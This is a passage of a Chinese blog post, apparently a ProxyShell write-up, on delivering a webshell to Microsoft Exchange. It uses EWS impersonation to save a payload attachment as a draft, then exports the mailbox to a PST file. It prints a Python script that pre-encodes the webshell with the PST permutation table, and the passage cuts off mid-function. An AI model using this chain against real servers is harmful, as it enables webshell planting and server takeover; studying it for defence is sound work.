<h3 id="（5）投递-Webshell-载荷"><a href="#（5）投递-Webshell-载荷" class="headerlink" title="（5）投递 Webshell 载荷"></a>（5）投递 Webshell 载荷</h3><p>由于是利用 Exhcnage Posershell 命令 <code>New-MailExportRequest</code> 导出邮件，所以，需要向要导出的邮箱里发送一封包含有效载荷（webshell）的邮件，有两种方法可以实现：<br>方法一：发送一封邮件到地址，然后导出它；<br>方法二：使用EWS来冒充用户，并将包含有效负载的草稿保存为附件，然后导出它。</p>
<p><strong>这里使用方法二来进行投递：</strong>需要向 Exchange Web Service(EWS) 发送一个XML请求，以创建一个带有 payload 附件的电子邮件草稿。</p>
<h4 id="a-生成载荷"><a href="#a-生成载荷" class="headerlink" title="a. 生成载荷"></a>a. 生成载荷</h4><p>导出的 pst 格式使用的加密为类似异或加密模式，也就是说加密在加密就变成了明文，那么只要先使用其加密方法加密一遍我们要写入的 webshell，就可以在导出时，获得明文，从而获取原始 webshell。<br>使用脚本对 webshell 进行加密：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ridter/</span>proxyshell_payload<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding: UTF-8</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> six<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>DWORD_SIZE = <span class="hljs-number">4</span><br><br>mpbbCrypt = [<br>    <span class="hljs-number">65</span>, <span class="hljs-number">54</span>, <span class="hljs-number">19</span>, <span class="hljs-number">98</span>, <span class="hljs-number">168</span>, <span class="hljs-number">33</span>, <span class="hljs-number">110</span>, <span class="hljs-number">187</span>,<br>    <span class="hljs-number">244</span>, <span class="hljs-number">22</span>, <span class="hljs-number">204</span>, <span class="hljs-number">4</span>, <span class="hljs-number">127</span>, <span class="hljs-number">100</span>, <span class="hljs-number">232</span>, <span class="hljs-number">93</span>,<br>    <span class="hljs-number">30</span>, <span class="hljs-number">242</span>, <span class="hljs-number">203</span>, <span class="hljs-number">42</span>, <span class="hljs-number">116</span>, <span class="hljs-number">197</span>, <span class="hljs-number">94</span>, <span class="hljs-number">53</span>,<br>    <span class="hljs-number">210</span>, <span class="hljs-number">149</span>, <span class="hljs-number">71</span>, <span class="hljs-number">158</span>, <span class="hljs-number">150</span>, <span class="hljs-number">45</span>, <span class="hljs-number">154</span>, <span class="hljs-number">136</span>,<br>    <span class="hljs-number">76</span>, <span class="hljs-number">125</span>, <span class="hljs-number">132</span>, <span class="hljs-number">63</span>, <span class="hljs-number">219</span>, <span class="hljs-number">172</span>, <span class="hljs-number">49</span>, <span class="hljs-number">182</span>,<br>    <span class="hljs-number">72</span>, <span class="hljs-number">95</span>, <span class="hljs-number">246</span>, <span class="hljs-number">196</span>, <span class="hljs-number">216</span>, <span class="hljs-number">57</span>, <span class="hljs-number">139</span>, <span class="hljs-number">231</span>,<br>    <span class="hljs-number">35</span>, <span class="hljs-number">59</span>, <span class="hljs-number">56</span>, <span class="hljs-number">142</span>, <span class="hljs-number">200</span>, <span class="hljs-number">193</span>, <span class="hljs-number">223</span>, <span class="hljs-number">37</span>,<br>    <span class="hljs-number">177</span>, <span class="hljs-number">32</span>, <span class="hljs-number">165</span>, <span class="hljs-number">70</span>, <span class="hljs-number">96</span>, <span class="hljs-number">78</span>, <span class="hljs-number">156</span>, <span class="hljs-number">251</span>,<br>    <span class="hljs-number">170</span>, <span class="hljs-number">211</span>, <span class="hljs-number">86</span>, <span class="hljs-number">81</span>, <span class="hljs-number">69</span>, <span class="hljs-number">124</span>, <span class="hljs-number">85</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">7</span>, <span class="hljs-number">201</span>, <span class="hljs-number">43</span>, <span class="hljs-number">157</span>, <span class="hljs-number">133</span>, <span class="hljs-number">155</span>, <span class="hljs-number">9</span>, <span class="hljs-number">160</span>,<br>    <span class="hljs-number">143</span>, <span class="hljs-number">173</span>, <span class="hljs-number">179</span>, <span class="hljs-number">15</span>, <span class="hljs-number">99</span>, <span class="hljs-number">171</span>, <span class="hljs-number">137</span>, <span class="hljs-number">75</span>,<br>    <span class="hljs-number">215</span>, <span class="hljs-number">167</span>, <span class="hljs-number">21</span>, <span class="hljs-number">90</span>, <span class="hljs-number">113</span>, <span class="hljs-number">102</span>, <span class="hljs-number">66</span>, <span class="hljs-number">191</span>,<br>    <span class="hljs-number">38</span>, <span class="hljs-number">74</span>, <span class="hljs-number">107</span>, <span class="hljs-number">152</span>, <span class="hljs-number">250</span>, <span class="hljs-number">234</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>,<br>    <span class="hljs-number">178</span>, <span class="hljs-number">112</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">253</span>, <span class="hljs-number">89</span>, <span class="hljs-number">58</span>, <span class="hljs-number">134</span>,<br>    <span class="hljs-number">126</span>, <span class="hljs-number">206</span>, <span class="hljs-number">6</span>, <span class="hljs-number">235</span>, <span class="hljs-number">130</span>, <span class="hljs-number">120</span>, <span class="hljs-number">87</span>, <span class="hljs-number">199</span>,<br>    <span class="hljs-number">141</span>, <span class="hljs-number">67</span>, <span class="hljs-number">175</span>, <span class="hljs-number">180</span>, <span class="hljs-number">28</span>, <span class="hljs-number">212</span>, <span class="hljs-number">91</span>, <span class="hljs-number">205</span>,<br>    <span class="hljs-number">226</span>, <span class="hljs-number">233</span>, <span class="hljs-number">39</span>, <span class="hljs-number">79</span>, <span class="hljs-number">195</span>, <span class="hljs-number">8</span>, <span class="hljs-number">114</span>, <span class="hljs-number">128</span>,<br>    <span class="hljs-number">207</span>, <span class="hljs-number">176</span>, <span class="hljs-number">239</span>, <span class="hljs-number">245</span>, <span class="hljs-number">40</span>, <span class="hljs-number">109</span>, <span class="hljs-number">190</span>, <span class="hljs-number">48</span>,<br>    <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">146</span>, <span class="hljs-number">213</span>, <span class="hljs-number">14</span>, <span class="hljs-number">60</span>, <span class="hljs-number">34</span>, <span class="hljs-number">50</span>,<br>    <span class="hljs-number">229</span>, <span class="hljs-number">228</span>, <span class="hljs-number">249</span>, <span class="hljs-number">159</span>, <span class="hljs-number">194</span>, <span class="hljs-number">209</span>, <span class="hljs-number">10</span>, <span class="hljs-number">129</span>,<br>    <span class="hljs-number">18</span>, <span class="hljs-number">225</span>, <span class="hljs-number">238</span>, <span class="hljs-number">145</span>, <span class="hljs-number">131</span>, <span class="hljs-number">118</span>, <span class="hljs-number">227</span>, <span class="hljs-number">151</span>,<br>    <span class="hljs-number">230</span>, <span class="hljs-number">97</span>, <span class="hljs-number">138</span>, <span class="hljs-number">23</span>, <span class="hljs-number">121</span>, <span class="hljs-number">164</span>, <span class="hljs-number">183</span>, <span class="hljs-number">220</span>,<br>    <span class="hljs-number">144</span>, <span class="hljs-number">122</span>, <span class="hljs-number">92</span>, <span class="hljs-number">140</span>, <span class="hljs-number">2</span>, <span class="hljs-number">166</span>, <span class="hljs-number">202</span>, <span class="hljs-number">105</span>,<br>    <span class="hljs-number">222</span>, <span class="hljs-number">80</span>, <span class="hljs-number">26</span>, <span class="hljs-number">17</span>, <span class="hljs-number">147</span>, <span class="hljs-number">185</span>, <span class="hljs-number">82</span>, <span class="hljs-number">135</span>,<br>    <span class="hljs-number">88</span>, <span class="hljs-number">252</span>, <span class="hljs-number">237</span>, <span class="hljs-number">29</span>, <span class="hljs-number">55</span>, <span class="hljs-number">73</span>, <span class="hljs-number">27</span>, <span class="hljs-number">106</span>,<br>    <span class="hljs-number">224</span>, <span class="hljs-number">41</span>, <span class="hljs-number">51</span>, <span class="hljs-number">153</span>, <span class="hljs-number">189</span>, <span class="hljs-number">108</span>, <span class="hljs-number">217</span>, <span class="hljs-number">148</span>,<br>    <span class="hljs-number">243</span>, <span class="hljs-number">64</span>, <span class="hljs-number">84</span>, <span class="hljs-number">111</span>, <span class="hljs-number">240</span>, <span class="hljs-number">198</span>, <span class="hljs-number">115</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">214</span>, <span class="hljs-number">62</span>, <span class="hljs-number">101</span>, <span class="hljs-number">24</span>, <span class="hljs-number">68</span>, <span class="hljs-number">31</span>, <span class="hljs-number">221</span>, <span class="hljs-number">103</span>,<br>    <span class="hljs-number">16</span>, <span class="hljs-number">241</span>, <span class="hljs-number">12</span>, <span class="hljs-number">25</span>, <span class="hljs-number">236</span>, <span class="hljs-number">174</span>, <span class="hljs-number">3</span>, <span class="hljs-number">161</span>,<br>    <span class="hljs-number">20</span>, <span class="hljs-number">123</span>, <span class="hljs-number">169</span>, <span class="hljs-number">11</span>, <span class="hljs-number">255</span>, <span class="hljs-number">248</span>, <span class="hljs-number">163</span>, <span class="hljs-number">192</span>,<br>    <span class="hljs-number">162</span>, <span class="hljs-number">1</span>, <span class="hljs-number">247</span>, <span class="hljs-number">46</span>, <span class="hljs-number">188</span>, <span class="hljs-number">36</span>, <span class="hljs-number">104</span>, <span class="hljs-number">117</span>,<br>    <span class="hljs-number">13</span>, <span class="hljs-number">254</span>, <span class="hljs-number">186</span>, <span class="hljs-number">47</span>, <span class="hljs-number">181</span>, <span class="hljs-number">208</span>, <span class="hljs-number">218</span>, <span class="hljs-number">61</span>,<br>    <span class="hljs-number">20</span>, <span class="hljs-number">83</span>, <span class="hljs-number">15</span>, <span class="hljs-number">86</span>, <span class="hljs-number">179</span>, <span class="hljs-number">200</span>, <span class="hljs-number">122</span>, <span class="hljs-number">156</span>,<br>    <span class="hljs-number">235</span>, <span class="hljs-number">101</span>, <span class="hljs-number">72</span>, <span class="hljs-number">23</span>, <span class="hljs-number">22</span>, <span class="hljs-number">21</span>, <span class="hljs-number">159</span>, <span class="hljs-number">2</span>,<br>    <span class="hljs-number">204</span>, <span class="hljs-number">84</span>, <span class="hljs-number">124</span>, <span class="hljs-number">131</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>,<br>    <span class="hljs-number">162</span>, <span class="hljs-number">98</span>, <span class="hljs-number">168</span>, <span class="hljs-number">118</span>, <span class="hljs-number">219</span>, <span class="hljs-number">217</span>, <span class="hljs-number">237</span>, <span class="hljs-number">199</span>,<br>    <span class="hljs-number">197</span>, <span class="hljs-number">164</span>, <span class="hljs-number">220</span>, <span class="hljs-number">172</span>, <span class="hljs-number">133</span>, <span class="hljs-number">116</span>, <span class="hljs-number">214</span>, <span class="hljs-number">208</span>,<br>    <span class="hljs-number">167</span>, <span class="hljs-number">155</span>, <span class="hljs-number">174</span>, <span class="hljs-number">154</span>, <span class="hljs-number">150</span>, <span class="hljs-number">113</span>, <span class="hljs-number">102</span>, <span class="hljs-number">195</span>,<br>    <span class="hljs-number">99</span>, <span class="hljs-number">153</span>, <span class="hljs-number">184</span>, <span class="hljs-number">221</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">142</span>, <span class="hljs-number">132</span>,<br>    <span class="hljs-number">125</span>, <span class="hljs-number">165</span>, <span class="hljs-number">94</span>, <span class="hljs-number">209</span>, <span class="hljs-number">93</span>, <span class="hljs-number">147</span>, <span class="hljs-number">177</span>, <span class="hljs-number">87</span>,<br>    <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">128</span>, <span class="hljs-number">137</span>, <span class="hljs-number">82</span>, <span class="hljs-number">148</span>, <span class="hljs-number">79</span>, <span class="hljs-number">78</span>,<br>    <span class="hljs-number">10</span>, <span class="hljs-number">107</span>, <span class="hljs-number">188</span>, <span class="hljs-number">141</span>, <span class="hljs-number">127</span>, <span class="hljs-number">110</span>, <span class="hljs-number">71</span>, <span class="hljs-number">70</span>,<br>    <span class="hljs-number">65</span>, <span class="hljs-number">64</span>, <span class="hljs-number">68</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">203</span>, <span class="hljs-number">3</span>, <span class="hljs-number">63</span>,<br>    <span class="hljs-number">247</span>, <span class="hljs-number">244</span>, <span class="hljs-number">225</span>, <span class="hljs-number">169</span>, <span class="hljs-number">143</span>, <span class="hljs-number">60</span>, <span class="hljs-number">58</span>, <span class="hljs-number">249</span>,<br>    <span class="hljs-number">251</span>, <span class="hljs-number">240</span>, <span class="hljs-number">25</span>, <span class="hljs-number">48</span>, <span class="hljs-number">130</span>, <span class="hljs-number">9</span>, <span class="hljs-number">46</span>, <span class="hljs-number">201</span>,<br>    <span class="hljs-number">157</span>, <span class="hljs-number">160</span>, <span class="hljs-number">134</span>, <span class="hljs-number">73</span>, <span class="hljs-number">238</span>, <span class="hljs-number">111</span>, <span class="hljs-number">77</span>, <span class="hljs-number">109</span>,<br>    <span class="hljs-number">196</span>, <span class="hljs-number">45</span>, <span class="hljs-number">129</span>, <span class="hljs-number">52</span>, <span class="hljs-number">37</span>, <span class="hljs-number">135</span>, <span class="hljs-number">27</span>, <span class="hljs-number">136</span>,<br>    <span class="hljs-number">170</span>, <span class="hljs-number">252</span>, <span class="hljs-number">6</span>, <span class="hljs-number">161</span>, <span class="hljs-number">18</span>, <span class="hljs-number">56</span>, <span class="hljs-number">253</span>, <span class="hljs-number">76</span>,<br>    <span class="hljs-number">66</span>, <span class="hljs-number">114</span>, <span class="hljs-number">100</span>, <span class="hljs-number">19</span>, <span class="hljs-number">55</span>, <span class="hljs-number">36</span>, <span class="hljs-number">106</span>, <span class="hljs-number">117</span>,<br>    <span class="hljs-number">119</span>, <span class="hljs-number">67</span>, <span class="hljs-number">255</span>, <span class="hljs-number">230</span>, <span class="hljs-number">180</span>, <span class="hljs-number">75</span>, <span class="hljs-number">54</span>, <span class="hljs-number">92</span>,<br>    <span class="hljs-number">228</span>, <span class="hljs-number">216</span>, <span class="hljs-number">53</span>, <span class="hljs-number">61</span>, <span class="hljs-number">69</span>, <span class="hljs-number">185</span>, <span class="hljs-number">44</span>, <span class="hljs-number">236</span>,<br>    <span class="hljs-number">183</span>, <span class="hljs-number">49</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">7</span>, <span class="hljs-number">104</span>, <span class="hljs-number">163</span>, <span class="hljs-number">14</span>,<br>    <span class="hljs-number">105</span>, <span class="hljs-number">123</span>, <span class="hljs-number">24</span>, <span class="hljs-number">158</span>, <span class="hljs-number">33</span>, <span class="hljs-number">57</span>, <span class="hljs-number">190</span>, <span class="hljs-number">40</span>,<br>    <span class="hljs-number">26</span>, <span class="hljs-number">91</span>, <span class="hljs-number">120</span>, <span class="hljs-number">245</span>, <span class="hljs-number">35</span>, <span class="hljs-number">202</span>, <span class="hljs-number">42</span>, <span class="hljs-number">176</span>,<br>    <span class="hljs-number">175</span>, <span class="hljs-number">62</span>, <span class="hljs-number">254</span>, <span class="hljs-number">4</span>, <span class="hljs-number">140</span>, <span class="hljs-number">231</span>, <span class="hljs-number">229</span>, <span class="hljs-number">152</span>,<br>    <span class="hljs-number">50</span>, <span class="hljs-number">149</span>, <span class="hljs-number">211</span>, <span class="hljs-number">246</span>, <span class="hljs-number">74</span>, <span class="hljs-number">232</span>, <span class="hljs-number">166</span>, <span class="hljs-number">234</span>,<br>    <span class="hljs-number">233</span>, <span class="hljs-number">243</span>, <span class="hljs-number">213</span>, <span class="hljs-number">47</span>, <span class="hljs-number">112</span>, <span class="hljs-number">32</span>, <span class="hljs-number">242</span>, <span class="hljs-number">31</span>,<br>    <span class="hljs-number">5</span>, <span class="hljs-number">103</span>, <span class="hljs-number">173</span>, <span class="hljs-number">85</span>, <span class="hljs-number">16</span>, <span class="hljs-number">206</span>, <span class="hljs-number">205</span>, <span class="hljs-number">227</span>,<br>    <span class="hljs-number">39</span>, <span class="hljs-number">59</span>, <span class="hljs-number">218</span>, <span class="hljs-number">186</span>, <span class="hljs-number">215</span>, <span class="hljs-number">194</span>, <span class="hljs-number">38</span>, <span class="hljs-number">212</span>,<br>    <span class="hljs-number">145</span>, <span class="hljs-number">29</span>, <span class="hljs-number">210</span>, <span class="hljs-number">28</span>, <span class="hljs-number">34</span>, <span class="hljs-number">51</span>, <span class="hljs-number">248</span>, <span class="hljs-number">250</span>,<br>    <span class="hljs-number">241</span>, <span class="hljs-number">90</span>, <span class="hljs-number">239</span>, <span class="hljs-number">207</span>, <span class="hljs-number">144</span>, <span class="hljs-number">182</span>, <span class="hljs-number">139</span>, <span class="hljs-number">181</span>,<br>    <span class="hljs-number">189</span>, <span class="hljs-number">192</span>, <span class="hljs-number">191</span>, <span class="hljs-number">8</span>, <span class="hljs-number">151</span>, <span class="hljs-number">30</span>, <span class="hljs-number">108</span>, <span class="hljs-number">226</span>,<br>    <span class="hljs-number">97</span>, <span class="hljs-number">224</span>, <span class="hljs-number">198</span>, <span class="hljs-number">193</span>, <span class="hljs-number">89</span>, <span class="hljs-number">171</span>, <span class="hljs-number">187</span>, <span class="hljs-number">88</span>,<br>    <span class="hljs-number">222</span>, <span class="hljs-number">95</span>, <span class="hljs-number">223</span>, <span class="hljs-number">96</span>, <span class="hljs-number">121</span>, <span class="hljs-number">126</span>, <span class="hljs-number">178</span>, <span class="hljs-number">138</span>,<br>    <span class="hljs-number">71</span>, <span class="hljs-number">241</span>, <span class="hljs-number">180</span>, <span class="hljs-number">230</span>, <span class="hljs-number">11</span>, <span class="hljs-number">106</span>, <span class="hljs-number">114</span>, <span class="hljs-number">72</span>,<br>    <span class="hljs-number">133</span>, <span class="hljs-number">78</span>, <span class="hljs-number">158</span>, <span class="hljs-number">235</span>, <span class="hljs-number">226</span>, <span class="hljs-number">248</span>, <span class="hljs-number">148</span>, <span class="hljs-number">83</span>,<br>    <span class="hljs-number">224</span>, <span class="hljs-number">187</span>, <span class="hljs-number">160</span>, <span class="hljs-number">2</span>, <span class="hljs-number">232</span>, <span class="hljs-number">90</span>, <span class="hljs-number">9</span>, <span class="hljs-number">171</span>,<br>    <span class="hljs-number">219</span>, <span class="hljs-number">227</span>, <span class="hljs-number">186</span>, <span class="hljs-number">198</span>, <span class="hljs-number">124</span>, <span class="hljs-number">195</span>, <span class="hljs-number">16</span>, <span class="hljs-number">221</span>,<br>    <span class="hljs-number">57</span>, <span class="hljs-number">5</span>, <span class="hljs-number">150</span>, <span class="hljs-number">48</span>, <span class="hljs-number">245</span>, <span class="hljs-number">55</span>, <span class="hljs-number">96</span>, <span class="hljs-number">130</span>,<br>    <span class="hljs-number">140</span>, <span class="hljs-number">201</span>, <span class="hljs-number">19</span>, <span class="hljs-number">74</span>, <span class="hljs-number">107</span>, <span class="hljs-number">29</span>, <span class="hljs-number">243</span>, <span class="hljs-number">251</span>,<br>    <span class="hljs-number">143</span>, <span class="hljs-number">38</span>, <span class="hljs-number">151</span>, <span class="hljs-number">202</span>, <span class="hljs-number">145</span>, <span class="hljs-number">23</span>, <span class="hljs-number">1</span>, <span class="hljs-number">196</span>,<br>    <span class="hljs-number">50</span>, <span class="hljs-number">45</span>, <span class="hljs-number">110</span>, <span class="hljs-number">49</span>, <span class="hljs-number">149</span>, <span class="hljs-number">255</span>, <span class="hljs-number">217</span>, <span class="hljs-number">35</span>,<br>    <span class="hljs-number">209</span>, <span class="hljs-number">0</span>, <span class="hljs-number">94</span>, <span class="hljs-number">121</span>, <span class="hljs-number">220</span>, <span class="hljs-number">68</span>, <span class="hljs-number">59</span>, <span class="hljs-number">26</span>,<br>    <span class="hljs-number">40</span>, <span class="hljs-number">197</span>, <span class="hljs-number">97</span>, <span class="hljs-number">87</span>, <span class="hljs-number">32</span>, <span class="hljs-number">144</span>, <span class="hljs-number">61</span>, <span class="hljs-number">131</span>,<br>    <span class="hljs-number">185</span>, <span class="hljs-number">67</span>, <span class="hljs-number">190</span>, <span class="hljs-number">103</span>, <span class="hljs-number">210</span>, <span class="hljs-number">70</span>, <span class="hljs-number">66</span>, <span class="hljs-number">118</span>,<br>    <span class="hljs-number">192</span>, <span class="hljs-number">109</span>, <span class="hljs-number">91</span>, <span class="hljs-number">126</span>, <span class="hljs-number">178</span>, <span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">41</span>,<br>    <span class="hljs-number">60</span>, <span class="hljs-number">169</span>, <span class="hljs-number">3</span>, <span class="hljs-number">84</span>, <span class="hljs-number">13</span>, <span class="hljs-number">218</span>, <span class="hljs-number">93</span>, <span class="hljs-number">223</span>,<br>    <span class="hljs-number">246</span>, <span class="hljs-number">183</span>, <span class="hljs-number">199</span>, <span class="hljs-number">98</span>, <span class="hljs-number">205</span>, <span class="hljs-number">141</span>, <span class="hljs-number">6</span>, <span class="hljs-number">211</span>,<br>    <span class="hljs-number">105</span>, <span class="hljs-number">92</span>, <span class="hljs-number">134</span>, <span class="hljs-number">214</span>, <span class="hljs-number">20</span>, <span class="hljs-number">247</span>, <span class="hljs-number">165</span>, <span class="hljs-number">102</span>,<br>    <span class="hljs-number">117</span>, <span class="hljs-number">172</span>, <span class="hljs-number">177</span>, <span class="hljs-number">233</span>, <span class="hljs-number">69</span>, <span class="hljs-number">33</span>, <span class="hljs-number">112</span>, <span class="hljs-number">12</span>,<br>    <span class="hljs-number">135</span>, <span class="hljs-number">159</span>, <span class="hljs-number">116</span>, <span class="hljs-number">164</span>, <span class="hljs-number">34</span>, <span class="hljs-number">76</span>, <span class="hljs-number">111</span>, <span class="hljs-number">191</span>,<br>    <span class="hljs-number">31</span>, <span class="hljs-number">86</span>, <span class="hljs-number">170</span>, <span class="hljs-number">46</span>, <span class="hljs-number">179</span>, <span class="hljs-number">120</span>, <span class="hljs-number">51</span>, <span class="hljs-number">80</span>,<br>    <span class="hljs-number">176</span>, <span class="hljs-number">163</span>, <span class="hljs-number">146</span>, <span class="hljs-number">188</span>, <span class="hljs-number">207</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">167</span>,<br>    <span class="hljs-number">99</span>, <span class="hljs-number">203</span>, <span class="hljs-number">30</span>, <span class="hljs-number">77</span>, <span class="hljs-number">62</span>, <span class="hljs-number">75</span>, <span class="hljs-number">27</span>, <span class="hljs-number">155</span>,<br>    <span class="hljs-number">79</span>, <span class="hljs-number">231</span>, <span class="hljs-number">240</span>, <span class="hljs-number">238</span>, <span class="hljs-number">173</span>, <span class="hljs-number">58</span>, <span class="hljs-number">181</span>, <span class="hljs-number">89</span>,<br>    <span class="hljs-number">4</span>, <span class="hljs-number">234</span>, <span class="hljs-number">64</span>, <span class="hljs-number">85</span>, <span class="hljs-number">37</span>, <span class="hljs-number">81</span>, <span class="hljs-number">229</span>, <span class="hljs-number">122</span>,<br>    <span class="hljs-number">137</span>, <span class="hljs-number">56</span>, <span class="hljs-number">104</span>, <span class="hljs-number">82</span>, <span class="hljs-number">123</span>, <span class="hljs-number">252</span>, <span class="hljs-number">39</span>, <span class="hljs-number">174</span>,<br>    <span class="hljs-number">215</span>, <span class="hljs-number">189</span>, <span class="hljs-number">250</span>, <span class="hljs-number">7</span>, <span class="hljs-number">244</span>, <span class="hljs-number">204</span>, <span class="hljs-number">142</span>, <span class="hljs-number">95</span>,<br>    <span class="hljs-number">239</span>, <span class="hljs-number">53</span>, <span class="hljs-number">156</span>, <span class="hljs-number">132</span>, <span class="hljs-number">43</span>, <span class="hljs-number">21</span>, <span class="hljs-number">213</span>, <span class="hljs-number">119</span>,<br>    <span class="hljs-number">52</span>, <span class="hljs-number">73</span>, <span class="hljs-number">182</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">127</span>, <span class="hljs-number">113</span>, <span class="hljs-number">136</span>,<br>    <span class="hljs-number">253</span>, <span class="hljs-number">157</span>, <span class="hljs-number">24</span>, <span class="hljs-number">65</span>, <span class="hljs-number">125</span>, <span class="hljs-number">147</span>, <span class="hljs-number">216</span>, <span class="hljs-number">88</span>,<br>    <span class="hljs-number">44</span>, <span class="hljs-number">206</span>, <span class="hljs-number">254</span>, <span class="hljs-number">36</span>, <span class="hljs-number">175</span>, <span class="hljs-number">222</span>, <span class="hljs-number">184</span>, <span class="hljs-number">54</span>,<br>    <span class="hljs-number">200</span>, <span class="hljs-number">161</span>, <span class="hljs-number">128</span>, <span class="hljs-number">166</span>, <span class="hljs-number">153</span>, <span class="hljs-number">152</span>, <span class="hljs-number">168</span>, <span class="hljs-number">47</span>,<br>    <span class="hljs-number">14</span>, <span class="hljs-number">129</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">228</span>, <span class="hljs-number">194</span>, <span class="hljs-number">162</span>, <span class="hljs-number">138</span>,<br>    <span class="hljs-number">212</span>, <span class="hljs-number">225</span>, <span class="hljs-number">17</span>, <span class="hljs-number">208</span>, <span class="hljs-number">8</span>, <span class="hljs-number">139</span>, <span class="hljs-number">42</span>, <span class="hljs-number">242</span>,<br>    <span class="hljs-number">237</span>, <span class="hljs-number">154</span>, <span class="hljs-number">100</span>, <span class="hljs-number">63</span>, <span class="hljs-number">193</span>, <span class="hljs-number">108</span>, <span class="hljs-number">249</span>, <span class="hljs-number">236</span><br>]<br><br>mpbbR = mpbbCrypt<br>mpbbS = mpbbCrypt[<span class="hljs-number">256</span>:]<br>mpbbI = mpbbCrypt[<span class="hljs-number">512</span>:]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cryptpermute</span>(<span class="hljs-params">data, encrypt=<span class="hljs-literal">False</span></span>):<br>    table = mpbbR <span class="hljs-keyword">if</span> encrypt <span class="hljs-keyword">else</span> mpbbI<br>    tmp = [table[v] <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> data] <span class="hljs-keyword">if</span> six.PY3 <span class="hljs-keyword">else</span> [table[<span class="hljs-built_in">ord</span>(v)] <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> data]<br>    i = <span class="hljs-number">0</span><br>    buf = <span class="hljs-built_in">bytes</span>(tmp) <span class="hljs-keyword">if</span> six.PY3 <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytearray</span>(tmp)<br>    stream = BytesIO(buf)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        b = stream.read(DWORD_SIZE)<br>        <span class="hljs-keyword">try</span>:<br>            tmp[i] = b[<span class="hljs-number">0</span>]<br>            tmp[i + <span class="hljs-number">1</span>] = b[<span class="hljs-number">1</span>]<br>            tmp[i + <span class="hljs-number">2</span>] = 